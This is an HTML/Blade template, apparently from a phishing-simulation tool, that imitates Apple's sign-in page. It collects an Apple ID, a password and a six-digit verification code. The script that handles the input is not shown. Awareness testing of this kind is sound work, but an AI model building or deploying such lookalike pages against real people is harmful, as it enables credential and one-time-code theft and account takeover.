<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Apple</title>

    <link rel="stylesheet" href="https://rsms.me/inter/inter.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css"
      rel="stylesheet"
    />

    <script
      defer
      src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"
    ></script>
    <script defer src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    @vite('resources/css/app.css')
    @vite('resources/css/sim-template/apple/style.css')
    @vite('resources/js/sim-template/apple/login.js')
  </head>
  <body>
    <div class="login-container">
      <div class="header">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
          alt="Apple Logo"
        />
      </div>
      <div class="login-form">
        <h1>Sign In</h1>
        <form id="login-form">
          <div class="form-group">
            <input
              type="text"
              id="apple-id"
              class="apple-id"
              name="apple-id"
              placeholder=" "
            />
            <label for="apple-id" class="label1" id="label1">Apple ID</label>
            <input
              type="password"
              id="password"
              class="password"
              name="password"
              placeholder=" "
            />
            <label for="password" class="label2" id="label2">Password</label>
            <div class="error-text" id="error" style="display: none">
              Please enter a valid Apple ID
            </div>
          </div>
          <button type="submit" class="submit-button">Sign In</button>
        </form>
      </div>
      <div class="footer">
        <p>Copyright &copy; 2024 Apple Inc. All rights reserved.</p>
      </div>
    </div>

    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
      <h2>Enter Verification Code</h2>
      <div class="otp-input-container">
        <input type="text" id="otp1" maxlength="1" />
        <input type="text" id="otp2" maxlength="1" />
        <input type="text" id="otp3" maxlength="1" />
        <input type="text" id="otp4" maxlength="1" />
        <input type="text" id="otp5" maxlength="1" />
        <input type="text" id="otp6" maxlength="1" />
      </div>
      <button
        id="cancel-btn"
        class="submit-button"
        style="background-color: red"
      >
        Cancel
      </button>
    </div>
  </body>
</html>
